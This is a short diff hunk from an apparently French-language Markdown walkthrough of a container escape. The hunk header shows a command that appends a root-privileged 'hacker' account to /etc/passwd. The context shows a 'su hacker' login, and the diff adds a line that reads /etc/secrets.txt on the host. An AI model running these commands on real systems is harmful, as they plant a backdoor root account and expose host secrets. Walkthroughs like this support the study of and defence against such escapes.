@@ -53,6 +53,7 @@ echo "hacker:x:0:0::/root:/bin/bash" >> /etc/passwd
 4️⃣ **Ouvrir une session sur l’hôte avec cet utilisateur** :
 ```sh
 su hacker
+cat /etc/secrets.txt
 ```
 📌 **Le conteneur a complètement pris le contrôle de l’hôte !** 😱
 
